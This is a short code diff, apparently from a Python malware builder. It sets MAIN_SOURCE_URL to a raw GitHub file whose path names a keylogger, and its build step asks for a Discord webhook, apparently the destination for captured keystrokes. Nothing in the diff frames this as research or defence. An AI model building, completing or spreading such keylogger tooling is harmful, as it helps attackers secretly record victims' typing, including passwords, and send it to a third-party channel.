@@ -3,7 +3,7 @@ import sys
 import subprocess
 import requests
 
-MAIN_SOURCE_URL = "x"
+MAIN_SOURCE_URL = "https://raw.githubusercontent.com/exsarorrayzer/logger-archive/refs/heads/main/Raw02/keylogger/raw.py"
 
 def build():
     webhook = input("Enter Discord Webhook: ").strip()
